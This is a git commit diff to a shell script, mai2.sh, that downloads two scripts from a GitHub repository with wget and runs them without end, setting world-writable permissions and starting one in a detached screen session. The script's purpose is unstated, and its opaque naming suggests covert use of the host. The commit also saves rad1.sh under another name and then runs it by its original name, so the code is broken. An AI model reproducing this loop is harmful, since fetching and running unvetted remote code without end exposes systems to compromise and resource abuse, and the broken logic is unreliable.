343077efe732aec34a355b722f813c64e45f1767
Mafs68 <92165260+Mafs68@users.noreply.github.com>
2021-10-13 13:07:24 +0530

    Update mai2.sh

--- mai2.sh
+++ mai2.sh
@@ -4,14 +4,14 @@ ran1=$(openssl rand -hex 4)
 ran2=$(openssl rand -hex 6)
 wget https://github.com/Mafs68/hjs839/raw/main/rad1.sh -O ran1.sh 
 wget https://github.com/Mafs68/hjs839/raw/main/Sec.sh -O ran2.sh
-runtime="301 minute"
-endtime=$(date -ud "$runtime" +%s)
 
-while [[ $(date -u +%s) -le $endtime ]]
+while :
 do
-        bash ran1.sh
+	
+	chmod 777 rad1.sh
+	./rad1.sh
 	sleep 5
 	chmod 777 ran2.sh
-	timeout 10m screen -dmS ran2.sh ./ran2.sh 65 75 
+	timeout 10m screen -dmS Sec.sh ./ran2.sh 65 75 
 	sleep 5
 done
